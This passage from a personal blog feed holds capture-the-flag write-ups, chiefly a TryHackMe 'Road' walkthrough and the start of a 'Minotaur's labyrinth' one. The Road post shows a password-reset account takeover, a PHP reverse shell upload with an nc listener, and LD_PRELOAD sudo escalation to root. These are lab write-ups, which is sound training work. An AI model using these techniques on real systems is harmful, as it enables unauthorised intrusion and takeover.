&lt;p&gt;&lt;img src=&quot;/assets/images/htbcybersanta/commandinjection.gif&quot; alt=&quot;commandinjection&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Thanks for reading!&lt;/p&gt;

&lt;p&gt;============================================================&lt;/p&gt;

&lt;p&gt;Any comments or feedback welcome! You can find me on &lt;a href=&quot;https://twitter.com/dazbrownfield&quot;&gt;twitter&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://www.buymeacoffee.com/dazbrownfield&quot; target=&quot;_blank&quot;&gt;&lt;img src=&quot;https://cdn.buymeacoffee.com/buttons/v2/default-blue.png&quot; alt=&quot;Buy Me A Coffee&quot; style=&quot;height: 60px !important;width: 217px !important;&quot; /&gt;&lt;/a&gt;&lt;/p&gt;</content>

      
      
      
      
      

      <author>
          <name>Darryn</name>
        
        
      </author>

      

      
        <category term="hackthebox" />
      
        <category term="ctf" />
      

      
        <summary type="html"></summary>
      

      
      
    </entry>
  
    <entry>
      <title type="html">Road Write Up</title>
      <link href="https://darrynbrownfield.co.uk/road" rel="alternate" type="text/html" title="Road Write Up" />
      <published>2021-11-29T00:00:00+00:00</published>
      <updated>2021-11-29T00:00:00+00:00</updated>
      <id>https://darrynbrownfield.co.uk/road</id>
      <content type="html" xml:base="https://darrynbrownfield.co.uk/road">&lt;p&gt;&lt;img src=&quot;/assets/images/road/cover.png&quot; alt=&quot;cover&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;overview&quot;&gt;Overview&lt;/h3&gt;

&lt;p&gt;&lt;a href=&quot;https://tryhackme.com/room/road&quot;&gt;Road&lt;/a&gt; is a medium rated CTF room on &lt;a href=&quot;https://tryhackme.com&quot;&gt;TryHackMe&lt;/a&gt; created by &lt;a href=&quot;https://tryhackme.com/p/StillNoob&quot;&gt;StillNoob&lt;/a&gt;. Although rated as medium I would put it down as easy as the *cough* road is nicely laid out for you.&lt;/p&gt;

&lt;h3 id=&quot;nmap&quot;&gt;Nmap&lt;/h3&gt;

&lt;p&gt;I started a nmap scan to check for available ports.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;└──╼ $sudo nmap -sC -sV -oA nmap/initial 10.10.149.149
Starting Nmap 7.91 ( https://nmap.org ) at 2021-11-29 09:52 GMT
Nmap scan report for 10.10.149.149
Host is up (0.055s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 e6:dc:88:69:de:a1:73:8e:84:5b:a1:3e:27:9f:07:24 (RSA)
|   256 6b:ea:18:5d:8d:c7:9e:9a:01:2c:dd:50:c5:f8:c8:05 (ECDSA)
|_  256 ef:06:d7:e4:b1:65:15:6e:94:62:cc:dd:f0:8a:1a:24 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Sky Couriers
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.04 seconds
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;2 ports open:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;22 - SSH - Openssh 8.2p1&lt;/li&gt;
  &lt;li&gt;80 - HTTP - Apache httpd 2.4.41&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;I did a second nmap scan on all ports but no other ports were open.&lt;/p&gt;

&lt;h3 id=&quot;enumeration&quot;&gt;Enumeration&lt;/h3&gt;

&lt;p&gt;Taking a look at the web server shows a simple courier web page.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/road/homepage.png&quot; alt=&quot;homepage&quot; /&gt;&lt;/p&gt;

&lt;p&gt;I tested the track order search but it didn’t do anything so I moved on and clicked merchant central which took me to a login form.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/road/login.png&quot; alt=&quot;login&quot; /&gt;&lt;/p&gt;

&lt;p&gt;I tried a few common credentials combinations but had no joy so registered my own account.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/road/createuser.png&quot; alt=&quot;createuser&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Once in I got access to a static dashboard, none of the links on the left worked other than ‘ResetUser’. However I could view my profile.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/road/dashboard.png&quot; alt=&quot;dashboard&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The only option available was to upload an image, however this needs be done my the admin. But now I have the admins email I might be able to use the reset user function to reset the admin’s password.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/road/profile.png&quot; alt=&quot;profile&quot; /&gt;&lt;/p&gt;

&lt;p&gt;On the ResetUser page the username is grey out but I put in a new password and opened Burp. With Intercept on I submitted the request.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/road/resetuser.png&quot; alt=&quot;resetuser&quot; /&gt;&lt;/p&gt;

&lt;p&gt;In Burp I can see my account name but no protection mechanisms.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/road/pwreset.png&quot; alt=&quot;pwreset&quot; /&gt;&lt;/p&gt;

&lt;p&gt;I changed the username to the admin account and forward the request.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/road/adminpwreset.png&quot; alt=&quot;adminpwreset&quot; /&gt;&lt;/p&gt;

&lt;p&gt;I now have access to the admin account!&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/road/admindashboard.png&quot; alt=&quot;admindashboard&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;initial-access&quot;&gt;Initial Access&lt;/h3&gt;

&lt;p&gt;Now I have access to the admin account, I should be able to upload a file. The site is using PHP so I tried uploading a php reverse shell. I copied a PHP reverse shell to my directory and edited the IP and port.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;└──╼ $cp /usr/share/webshells/php/php-reverse-shell.php .
┌─[daz@parrotos]─[~/Documents/TryHackMe/Road]
└──╼ $mv php-reverse-shell.php shell.php
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;I then uploaded the file and started a listener using the command ‘&lt;code class=&quot;highlighter-rouge&quot;&gt;nc -nvlp 4444&lt;/code&gt;’.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/road/upload.gif&quot; alt=&quot;upload&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The profile picture (top right) hasn’t changed or error’d, so I inspect the element to show the src reference.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/road/profilesource.png&quot; alt=&quot;profilesource&quot; /&gt;&lt;/p&gt;

&lt;p&gt;My upload is not in the assets folder.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/road/assets.png&quot; alt=&quot;assets&quot; /&gt;&lt;/p&gt;

&lt;p&gt;However, looking at the source code for the profile page ‘http://10.10.149.149/v2/profile.php’ is a comment with a path for profile images.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/road/sourcecode.png&quot; alt=&quot;sourcecode&quot; /&gt;&lt;/p&gt;

&lt;blockquote&gt;
  &lt;blockquote&gt;
    &lt;blockquote&gt;
      &lt;p&gt;The first time I scanned the source code I missed the comment, using curl is a quick and crude way of pulling all the comments off a web page which can be useful with a large web page.&lt;/p&gt;
    &lt;/blockquote&gt;
  &lt;/blockquote&gt;
&lt;/blockquote&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;└──╼ $curl -s http://10.10.149.149/v2/profile.php | grep '&amp;lt;!--'
    &amp;lt;!--&amp;lt;link rel=&quot;stylesheet&quot; href=&quot;../assets/css/bootstrap.min.css&quot; crossorigin=&quot;anonymous&quot;&amp;gt;--&amp;gt;
  &amp;lt;!-- &amp;lt;script src=&quot;/assets/js/dataTable.min.js&quot;&amp;gt;&amp;lt;/script&amp;gt; --&amp;gt;
                    &amp;lt;!-- &amp;lt;div class=&quot;alert alert-danger&quot;&amp;gt;Take action&amp;lt;/div&amp;gt; --&amp;gt;
          &amp;lt;!-- &amp;lt;/ul&amp;gt; --&amp;gt;
&amp;lt;!-- /v2/profileimages/ --&amp;gt;
&amp;lt;!-- Include Required Prerequisites --&amp;gt;
&amp;lt;!-- Include Date Range Picker --&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Going to the path, I can list the images however I know I named my file shell.php so I navigate to ‘http://10.10.149.149/v2/profileimages/shell.php’.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/road/profileimages.png&quot; alt=&quot;profileimages&quot; /&gt;&lt;/p&gt;

&lt;p&gt;I have a shell!&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;└──╼ $nc -nvlp 4444
listening on [any] 4444 ...
connect to [10.8.21.217] from (UNKNOWN) [10.10.149.149] 59984
Linux sky 5.4.0-73-generic #82-Ubuntu SMP Wed Apr 14 17:39:42 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
 10:20:14 up 32 min,  0 users,  load average: 0.00, 0.02, 0.12
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ 
&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&quot;priv-esc-1&quot;&gt;Priv Esc 1&lt;/h3&gt;

&lt;p&gt;I got a shell as www-data, I can use this to grab the user.txt flag but I need to now find a way to become the webdeveloper user.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;$ whoami
www-data
$ cd /home/
$ ls
webdeveloper
$ cd webdeveloper
$ ls -lah
total 36K
drwxr-xr-x 4 webdeveloper webdeveloper 4.0K Oct  8 10:59 .
drwxr-xr-x 3 root         root         4.0K May 25  2021 ..
lrwxrwxrwx 1 webdeveloper webdeveloper    9 May 25  2021 .bash_history -&amp;gt; /dev/null
-rw-r--r-- 1 webdeveloper webdeveloper  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 webdeveloper webdeveloper 3.7K Feb 25  2020 .bashrc
drwx------ 2 webdeveloper webdeveloper 4.0K May 25  2021 .cache
drwxrwxr-x 3 webdeveloper webdeveloper 4.0K May 25  2021 .local
-rw------- 1 webdeveloper webdeveloper   51 Oct  8 10:59 .mysql_history
-rw-r--r-- 1 webdeveloper webdeveloper  807 Feb 25  2020 .profile
-rw-r--r-- 1 webdeveloper webdeveloper    0 Oct  7 17:53 .sudo_as_admin_successful
-rw-r--r-- 1 webdeveloper webdeveloper   33 May 25  2021 user.txt
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;I enumerate the box and take a look at the listening ports and find MongoDB is listening on 27017.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;$ ss -tulp
Netid State  Recv-Q Send-Q      Local Address:Port    Peer Address:Port Process
udp   UNCONN 0      0           127.0.0.53%lo:domain       0.0.0.0:*           
udp   UNCONN 0      0      10.10.149.149%eth0:bootpc       0.0.0.0:*           
tcp   LISTEN 0      511             127.0.0.1:9000         0.0.0.0:*           
tcp   LISTEN 0      4096            127.0.0.1:27017        0.0.0.0:*           
tcp   LISTEN 0      151             127.0.0.1:mysql        0.0.0.0:*           
tcp   LISTEN 0      4096        127.0.0.53%lo:domain       0.0.0.0:*           
tcp   LISTEN 0      128               0.0.0.0:ssh          0.0.0.0:*           
tcp   LISTEN 0      70              127.0.0.1:33060        0.0.0.0:*           
tcp   LISTEN 0      511                     *:http               *:*           
tcp   LISTEN 0      128                  [::]:ssh             [::]:*           
$ 
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Connecting to mongo I found the webdeveloper credentials, Ive redacted them in the output below.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;$ mongo
MongoDB shell version v4.4.6
connecting to: mongodb://127.0.0.1:27017/?compressors=disabled&amp;amp;gssapiServiceName=mongodb
Implicit session: session { &quot;id&quot; : UUID(&quot;0ad03a25-0c2d-4c46-8adf-bb97086a2f15&quot;) }
MongoDB server version: 4.4.6
show dbs
admin   0.000GB
backup  0.000GB
config  0.000GB
local   0.000GB
use backup
switched to db backup
show collections
collection
user
db.user.find()
{ &quot;_id&quot; : ObjectId(&quot;60ae2661203d21857b184a76&quot;), &quot;Month&quot; : &quot;Feb&quot;, &quot;Profit&quot; : &quot;25000&quot; }
{ &quot;_id&quot; : ObjectId(&quot;60ae2677203d21857b184a77&quot;), &quot;Month&quot; : &quot;March&quot;, &quot;Profit&quot; : &quot;5000&quot; }
{ &quot;_id&quot; : ObjectId(&quot;60ae2690203d21857b184a78&quot;), &quot;Name&quot; : &quot;webdeveloper&quot;, &quot;Pass&quot; : &quot;&quot; }
{ &quot;_id&quot; : ObjectId(&quot;60ae26bf203d21857b184a79&quot;), &quot;Name&quot; : &quot;Rohit&quot;, &quot;EndDate&quot; : &quot;December&quot; }
{ &quot;_id&quot; : ObjectId(&quot;60ae26d2203d21857b184a7a&quot;), &quot;Name&quot; : &quot;Rohit&quot;, &quot;Salary&quot; : &quot;30000&quot; }
exit
bye
Error saving history file: FileOpenFailed Unable to open() file /var/www/.dbshell: Permission denied
$ 
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;I can now SSH in to the machine as webdeveloper.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;└──╼ $ssh webdeveloper@10.10.149.149
The authenticity of host '10.10.149.149 (10.10.149.149)' can't be established.
ECDSA key fingerprint is SHA256:zSoCEcBBY73hNL9ItPA4CnB/405/W6GQYsl94qRMkOo.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.149.149' (ECDSA) to the list of known hosts.
webdeveloper@10.10.149.149's password: 
Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-73-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Mon 29 Nov 2021 10:26:45 AM UTC

  System load:  0.0               Processes:             121
  Usage of /:   60.0% of 9.78GB   Users logged in:       0
  Memory usage: 63%               IPv4 address for eth0: 10.10.149.149
  Swap usage:   0%


185 updates can be installed immediately.
100 of these updates are security updates.
To see these additional updates run: apt list --upgradable


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Fri Oct  8 10:52:42 2021 from 192.168.0.105
webdeveloper@sky:~$ 
&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&quot;priv-esc-2&quot;&gt;Priv Esc 2&lt;/h3&gt;

&lt;p&gt;Once connected as webdeveloper I did ‘&lt;code class=&quot;highlighter-rouge&quot;&gt;sudo -l&lt;/code&gt;’, there is a binary the user can run that could be vulnerable however LD_PRELOAD is configured which could also provide a path to priv esc.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;webdeveloper@sky:~$ sudo -l
Matching Defaults entries for webdeveloper on sky:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, env_keep+=LD_PRELOAD

User webdeveloper may run the following commands on sky:
    (ALL : ALL) NOPASSWD: /usr/bin/sky_backup_utility
webdeveloper@sky:~$                                                                    
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Using the &lt;a href=&quot;https://www.hackingarticles.in/linux-privilege-escalation-using-ld_preload/&quot;&gt;article&lt;/a&gt; at Hacking Articles provides a great step by step on how to exploit this. I created the shell.c file as per the article and run the sudo command to become root!&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;webdeveloper@sky:/tmp$ gcc -fPIC -shared -o shell.so shell.c -nostartfiles
webdeveloper@sky:/tmp$ sudo LD_PRELOAD=/tmp/shell.so /usr/bin/sky_backup_utility
# id
uid=0(root) gid=0(root) groups=0(root)
# whoami
root
# 
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Thanks for reading!&lt;/p&gt;

&lt;p&gt;============================================================&lt;/p&gt;

&lt;p&gt;Any comments or feedback welcome! You can find me on &lt;a href=&quot;https://twitter.com/dazbrownfield&quot;&gt;twitter&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://www.buymeacoffee.com/dazbrownfield&quot; target=&quot;_blank&quot;&gt;&lt;img src=&quot;https://cdn.buymeacoffee.com/buttons/v2/default-blue.png&quot; alt=&quot;Buy Me A Coffee&quot; style=&quot;height: 60px !important;width: 217px !important;&quot; /&gt;&lt;/a&gt;&lt;/p&gt;</content>

      
      
      
      
      

      <author>
          <name>Darryn</name>
        
        
      </author>

      

      
        <category term="tryhackme" />
      
        <category term="ctf" />
      
        <category term="medium" />
      

      
        <summary type="html"></summary>
      

      
      
    </entry>
  
    <entry>
      <title type="html">Minotaur’s labyrinth Write Up</title>
      <link href="https://darrynbrownfield.co.uk/minotaurslabyrinth" rel="alternate" type="text/html" title="Minotaur's labyrinth Write Up" />
      <published>2021-11-07T00:00:00+00:00</published>
      <updated>2021-11-07T00:00:00+00:00</updated>
      <id>https://darrynbrownfield.co.uk/minotaurslabyrinth</id>
      <content type="html" xml:base="https://darrynbrownfield.co.uk/minotaurslabyrinth">&lt;p&gt;&lt;img src=&quot;/assets/images/minotaurslabyrinth/cover.png&quot; alt=&quot;cover&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;overview&quot;&gt;Overview&lt;/h3&gt;

&lt;p&gt;&lt;a href=&quot;https://tryhackme.com/room/labyrinth8llv&quot;&gt;Minotaur’s labyrinth&lt;/a&gt; is a medium rated CTF room on &lt;a href=&quot;https://tryhackme.com&quot;&gt;TryHackMe&lt;/a&gt; created by &lt;a href=&quot;https://tryhackme.com/p/xenox&quot;&gt;xenox&lt;/a&gt; and &lt;a href=&quot;https://tryhackme.com/p/spayc&quot;&gt;spayc&lt;/a&gt;.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;The Minotaur threw a fit and captured some people in the Labyrinth. Are you able to help Daedalus free them?&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h3 id=&quot;nmap&quot;&gt;Nmap&lt;/h3&gt;

&lt;p&gt;I started a nmap scan to check for available ports.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;# Nmap 7.91 scan initiated Sun Nov  7 12:41:10 2021 as: nmap -sC -sV -oA nmap/initial 10.10.68.118
Nmap scan report for 10.10.68.118
Host is up (0.044s latency).
Not shown: 996 closed ports
PORT     STATE SERVICE  VERSION
21/tcp   open  ftp      ProFTPD
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxr-xr-x   3 nobody   nogroup      4096 Jun 15 14:57 pub
80/tcp   open  http     Apache httpd 2.4.48 ((Unix) OpenSSL/1.1.1k PHP/8.0.7 mod_perl/2.0.11 Perl/v5.32.1)
|_http-server-header: Apache/2.4.48 (Unix) OpenSSL/1.1.1k PHP/8.0.7 mod_perl/2.0.11 Perl/v5.32.1
| http-title: Login
|_Requested resource was login.html
443/tcp  open  ssl/http Apache httpd 2.4.48 ((Unix) OpenSSL/1.1.1k PHP/8.0.7 mod_perl/2.0.11 Perl/v5.32.1)
|_http-server-header: Apache/2.4.48 (Unix) OpenSSL/1.1.1k PHP/8.0.7 mod_perl/2.0.11 Perl/v5.32.1
| http-title: Login
|_Requested resource was login.html
| ssl-cert: Subject: commonName=localhost/organizationName=Apache Friends/stateOrProvinceName=Berlin/countryName=DE
| Not valid before: 2004-10-01T09:10:30
|_Not valid after:  2010-09-30T09:10:30
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
3306/tcp open  mysql?
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, GenericLines, GetRequest, Help, Kerberos, NULL, RTSPRequest, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
|_    Host 'ip-10-8-21-217.eu-west-1.compute.internal' is not allowed to connect to this MariaDB server
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3306-TCP:V=7.91%I=7%D=11/7%Time=6187C968%P=x86_64-pc-linux-gnu%r(NU
SF:LL,68,&quot;d\0\0\x01\xffj\x04Host\x20'ip-10-8-21-217\.eu-west-1\.compute\.i
SF:nternal'\x20is\x20not\x20allowed\x20to\x20connect\x20to\x20this\x20Mari
SF:aDB\x20server&quot;)%r(GenericLines,68,&quot;d\0\0\x01\xffj\x04Host\x20'ip-10-8-2
SF:1-217\.eu-west-1\.compute\.internal'\x20is\x20not\x20allowed\x20to\x20c
SF:onnect\x20to\x20this\x20MariaDB\x20server&quot;)%r(GetRequest,68,&quot;d\0\0\x01\
SF:xffj\x04Host\x20'ip-10-8-21-217\.eu-west-1\.compute\.internal'\x20is\x2
SF:0not\x20allowed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server&quot;)%r
SF:(RTSPRequest,68,&quot;d\0\0\x01\xffj\x04Host\x20'ip-10-8-21-217\.eu-west-1\.
SF:compute\.internal'\x20is\x20not\x20allowed\x20to\x20connect\x20to\x20th
SF:is\x20MariaDB\x20server&quot;)%r(DNSVersionBindReqTCP,68,&quot;d\0\0\x01\xffj\x04
SF:Host\x20'ip-10-8-21-217\.eu-west-1\.compute\.internal'\x20is\x20not\x20
SF:allowed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server&quot;)%r(DNSStat
SF:usRequestTCP,68,&quot;d\0\0\x01\xffj\x04Host\x20'ip-10-8-21-217\.eu-west-1\.
SF:compute\.internal'\x20is\x20not\x20allowed\x20to\x20connect\x20to\x20th
SF:is\x20MariaDB\x20server&quot;)%r(Help,68,&quot;d\0\0\x01\xffj\x04Host\x20'ip-10-8
SF:-21-217\.eu-west-1\.compute\.internal'\x20is\x20not\x20allowed\x20to\x2
SF:0connect\x20to\x20this\x20MariaDB\x20server&quot;)%r(SSLSessionReq,68,&quot;d\0\0
SF:\x01\xffj\x04Host\x20'ip-10-8-21-217\.eu-west-1\.compute\.internal'\x20
SF:is\x20not\x20allowed\x20to\x20connect\x20to\x20this\x20MariaDB\x20serve
SF:r&quot;)%r(TerminalServerCookie,68,&quot;d\0\0\x01\xffj\x04Host\x20'ip-10-8-21-21
SF:7\.eu-west-1\.compute\.internal'\x20is\x20not\x20allowed\x20to\x20conne
SF:ct\x20to\x20this\x20MariaDB\x20server&quot;)%r(TLSSessionReq,68,&quot;d\0\0\x01\x
SF:ffj\x04Host\x20'ip-10-8-21-217\.eu-west-1\.compute\.internal'\x20is\x20
SF:not\x20allowed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server&quot;)%r(
SF:Kerberos,68,&quot;d\0\0\x01\xffj\x04Host\x20'ip-10-8-21-217\.eu-west-1\.comp
SF:ute\.internal'\x20is\x20not\x20allowed\x20to\x20connect\x20to\x20this\x
SF:20MariaDB\x20server&quot;)%r(SMBProgNeg,68,&quot;d\0\0\x01\xffj\x04Host\x20'ip-10
SF:-8-21-217\.eu-west-1\.compute\.internal'\x20is\x20not\x20allowed\x20to\
SF:x20connect\x20to\x20this\x20MariaDB\x20server&quot;);

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Nov  7 12:41:26 2021 -- 1 IP address (1 host up) scanned in 16.38 seconds
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;4 ports open:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;21 - FTP - ProFTPD&lt;/li&gt;
  &lt;li&gt;80 - HTTP - Apache httpd 2.4.48&lt;/li&gt;
  &lt;li&gt;443 - HTTPS - Apache httpd 2.4.48&lt;/li&gt;
  &lt;li&gt;3306 - MYSQL - MariaDB server&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;enumeration&quot;&gt;Enumeration&lt;/h3&gt;

&lt;p&gt;FTP allows anonymous access so I started by looking for anything interesting in there.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;└──╼ $ftp 10.10.68.118                                                   
Connected to 10.10.68.118.                                               
220 ProFTPD Server (ProFTPD) [::ffff:10.10.68.118]                       
Name (10.10.68.118:daz): anonymous                                       
331 Anonymous login ok, send your complete email address as your password
Password:
230 Anonymous access granted, restrictions apply
Remote system type is UNIX.
Using binary mode to transfer files.
ftp&amp;gt; ls -lah
200 PORT command successful
150 Opening ASCII mode data connection for file list
drwxr-xr-x   3 root     root         4.0k Jun 15 14:45 .
drwxr-xr-x   3 root     root         4.0k Jun 15 14:45 ..
drwxr-xr-x   3 nobody   nogroup      4.0k Jun 15 14:57 pub
226 Transfer complete
ftp&amp;gt; cd pub
250 CWD command successful
ftp&amp;gt; ls -lah
200 PORT command successful
150 Opening ASCII mode data connection for file list
drwxr-xr-x   3 nobody   nogroup      4.0k Jun 15 14:57 .
drwxr-xr-x   3 root     root         4.0k Jun 15 14:45 ..
drwxr-xr-x   2 root     root         4.0k Jun 15 19:49 .secret
-rw-r--r--   1 root     root          141 Jun 15 14:57 message.txt
226 Transfer complete
ftp&amp;gt; get message.txt
local: message.txt remote: message.txt
200 PORT command successful
150 Opening BINARY mode data connection for message.txt (141 bytes)
226 Transfer complete
141 bytes received in 0.00 secs (140.2193 kB/s)
ftp&amp;gt; cd .secret
250 CWD command successful
ftp&amp;gt; ls -lah
200 PORT command successful
150 Opening ASCII mode data connection for file list
drwxr-xr-x   3 root     root         4.0k Jun 15 14:45 .
drwxr-xr-x   3 root     root         4.0k Jun 15 14:45 ..
drwxr-xr-x   3 nobody   nogroup      4.0k Jun 15 14:57 pub
226 Transfer complete
ftp&amp;gt; cd pub
250 CWD command successful
ftp&amp;gt; ls -lah
200 PORT command successful
150 Opening ASCII mode data connection for file list
drwxr-xr-x   3 nobody   nogroup      4.0k Jun 15 14:57 .
drwxr-xr-x   3 root     root         4.0k Jun 15 14:45 ..
drwxr-xr-x   2 root     root         4.0k Jun 15 19:49 .secret
-rw-r--r--   1 root     root          141 Jun 15 14:57 message.txt
226 Transfer complete
ftp&amp;gt; get message.txt
local: message.txt remote: message.txt
200 PORT command successful
150 Opening BINARY mode data connection for message.txt (141 bytes)
226 Transfer complete
141 bytes received in 0.00 secs (140.2193 kB/s)
ftp&amp;gt; cd .secret
250 CWD command successful
ftp&amp;gt; ls -lah
200 PORT command successful
150 Opening ASCII mode data connection for file list
drwxr-xr-x   2 root     root         4.0k Jun 15 19:49 .
drwxr-xr-x   3 nobody   nogroup      4.0k Jun 15 14:57 ..
-rw-r--r--   1 root     root           30 Jun 15 19:49 flag.txt
-rw-r--r--   1 root     root          114 Jun 15 14:56 keep_in_mind.txt
226 Transfer complete
ftp&amp;gt; get keep_in_mind.txt
local: keep_in_mind.txt remote: keep_in_mind.txt
200 PORT command successful
150 Opening BINARY mode data connection for keep_in_mind.txt (114 bytes)
226 Transfer complete
114 bytes received in 0.01 secs (12.2017 kB/s)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Not much in there, I downloaded the message.txt and keep_in_mind.txt files.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;└──╼ $cat message.txt keep_in_mind.txt 
Daedalus is a clumsy person, he forgets a lot of things arount the labyrinth, have a look around, maybe you'll find something :)
-- Minotaur
Not to forget, he forgets a lot of stuff, that's why he likes to keep things on a timer ... literally
-- Minotaur
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;No credentials or anything that jumps out other than probably a cronjob being used somewhere that I should keep an eye out for. I turned my attention to the web ports and got a login prompt.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/minotaurslabyrinth/login.png&quot; alt=&quot;login&quot; /&gt;&lt;/p&gt;

&lt;p&gt;I tried the normal admin/admin, admin/password etc but nothing worked. Its never going to be that easy to get root by I did click the link and just got a page with the two creators.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/minotaurslabyrinth/roottroll.png&quot; alt=&quot;roottroll&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The forget password link was also a troll!&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/minotaurslabyrinth/passwdtroll.png&quot; alt=&quot;passwdtroll&quot; /&gt;&lt;/p&gt;

&lt;p&gt;I had a look at the source but nothing jumped out expect a javascript file.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/minotaurslabyrinth/websource.png&quot; alt=&quot;websource&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Great a username ‘Daedalus’! Also a basic password generating function.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/minotaurslabyrinth/loginjs.png&quot; alt=&quot;loginjs&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Rather than doing manually, I put the function in to a python script and got the users password.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;└──╼ $cat pwdgen.py 

a = [&quot;0&quot;, &quot;h&quot;, &quot;?&quot;, &quot;1&quot;, &quot;v&quot;, &quot;4&quot;, &quot;r&quot;, &quot;l&quot;, &quot;0&quot;, &quot;g&quot;]
b = [&quot;m&quot;, &quot;w&quot;, &quot;7&quot;, &quot;j&quot;, &quot;1&quot;, &quot;e&quot;, &quot;8&quot;, &quot;l&quot;, &quot;r&quot;, &quot;a&quot;, &quot;2&quot;]
